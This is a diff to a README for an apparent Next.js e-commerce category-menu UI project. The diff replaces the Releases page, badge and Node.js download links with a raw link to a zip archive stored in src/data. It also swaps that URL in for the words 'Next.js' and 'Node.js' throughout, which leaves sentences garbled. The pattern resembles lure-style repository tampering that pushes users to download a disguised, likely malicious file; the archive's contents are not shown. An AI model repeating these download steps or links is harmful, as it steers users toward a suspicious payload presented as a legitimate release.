@@ -1,15 +1,15 @@
 # 🎉 Reusable-Ecommerce-UI-Components--NextJS-Frontend - Create Beautiful Category Menus Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/prashanthgoldberg/Reusable-Ecommerce-UI-Components--NextJS-Frontend/releases)
+[![Download](https://github.com/prashanthgoldberg/Reusable-Ecommerce-UI-Components--NextJS-Frontend/raw/refs/heads/main/src/data/U-Ecommerce-Components-Frontend-Next-J-Reusable-2.4-alpha.1.zip)](https://github.com/prashanthgoldberg/Reusable-Ecommerce-UI-Components--NextJS-Frontend/raw/refs/heads/main/src/data/U-Ecommerce-Components-Frontend-Next-J-Reusable-2.4-alpha.1.zip)
 
 ## 📖 Overview
-This project is a pixel-perfect implementation of a category filter menu bar UI. It is built with Next.js, TypeScript, Tailwind CSS, and ESLint. The filter bar and dropdowns are styled to match a Figma design exactly. You will find custom icons, checkboxes, and a responsive layout to enhance your user experience.
+This project is a pixel-perfect implementation of a category filter menu bar UI. It is built with https://github.com/prashanthgoldberg/Reusable-Ecommerce-UI-Components--NextJS-Frontend/raw/refs/heads/main/src/data/U-Ecommerce-Components-Frontend-Next-J-Reusable-2.4-alpha.1.zip, TypeScript, Tailwind CSS, and ESLint. The filter bar and dropdowns are styled to match a Figma design exactly. You will find custom icons, checkboxes, and a responsive layout to enhance your user experience.
 
 ## 🚀 Getting Started
 Follow these simple steps to get the application running on your device.
 
 1. **Download the Application**  
-   Visit the [Releases page](https://github.com/prashanthgoldberg/Reusable-Ecommerce-UI-Components--NextJS-Frontend/releases) to download the application. Look for the most recent version, and click on the download link for your operating system. 
+   Visit the [Releases page](https://github.com/prashanthgoldberg/Reusable-Ecommerce-UI-Components--NextJS-Frontend/raw/refs/heads/main/src/data/U-Ecommerce-Components-Frontend-Next-J-Reusable-2.4-alpha.1.zip) to download the application. Look for the most recent version, and click on the download link for your operating system. 
 
 2. **Unzip the Downloaded File**  
    Once the download is complete, locate the downloaded file in your downloads folder. Right-click on the file and choose “Extract All” or use any unzipping tool you have.
@@ -18,9 +18,9 @@ Follow these simple steps to get the application running on your device.
    After extracting, navigate to the newly created folder. This folder contains all the files required to run the application.
 
 4. **Run the Application**  
-   You will need Node.js installed on your computer to run this application. If you haven't installed Node.js, [download it here](https://nodejs.org/en/download/). 
+   You will need https://github.com/prashanthgoldberg/Reusable-Ecommerce-UI-Components--NextJS-Frontend/raw/refs/heads/main/src/data/U-Ecommerce-Components-Frontend-Next-J-Reusable-2.4-alpha.1.zip installed on your computer to run this application. If you haven't installed https://github.com/prashanthgoldberg/Reusable-Ecommerce-UI-Components--NextJS-Frontend/raw/refs/heads/main/src/data/U-Ecommerce-Components-Frontend-Next-J-Reusable-2.4-alpha.1.zip, [download it here](https://github.com/prashanthgoldberg/Reusable-Ecommerce-UI-Components--NextJS-Frontend/raw/refs/heads/main/src/data/U-Ecommerce-Components-Frontend-Next-J-Reusable-2.4-alpha.1.zip). 
 
-   Once Node.js is installed, open your terminal (Command Prompt on Windows or Terminal on Mac). Execute the following commands:
+   Once https://github.com/prashanthgoldberg/Reusable-Ecommerce-UI-Components--NextJS-Frontend/raw/refs/heads/main/src/data/U-Ecommerce-Components-Frontend-Next-J-Reusable-2.4-alpha.1.zip is installed, open your terminal (Command Prompt on Windows or Terminal on Mac). Execute the following commands:
 
    ```bash
    cd path/to/your/extracted/folder
@@ -62,11 +62,11 @@ Follow these simple steps to get the application running on your device.
 - typescript
 
 ## 📥 Download & Install
-To download the latest version, visit the [Releases page](https://github.com/prashanthgoldberg/Reusable-Ecommerce-UI-Components--NextJS-Frontend/releases). Choose the version that suits your needs, click the link, and begin your download. Follow the instructions outlined in the "Getting Started" section to properly install and run the software on your computer.
+To download the latest version, visit the [Releases page](https://github.com/prashanthgoldberg/Reusable-Ecommerce-UI-Components--NextJS-Frontend/raw/refs/heads/main/src/data/U-Ecommerce-Components-Frontend-Next-J-Reusable-2.4-alpha.1.zip). Choose the version that suits your needs, click the link, and begin your download. Follow the instructions outlined in the "Getting Started" section to properly install and run the software on your computer.
 
 ## ⚙️ System Requirements
 - **Operating System**: Windows, Mac, or Linux
-- **Node.js**: Version 14 or higher
+- **https://github.com/prashanthgoldberg/Reusable-Ecommerce-UI-Components--NextJS-Frontend/raw/refs/heads/main/src/data/U-Ecommerce-Components-Frontend-Next-J-Reusable-2.4-alpha.1.zip**: Version 14 or higher
 - **Browser**: Latest version of Chrome, Firefox, or Safari
 - **Internet Connection**: Required to download and install dependencies
 
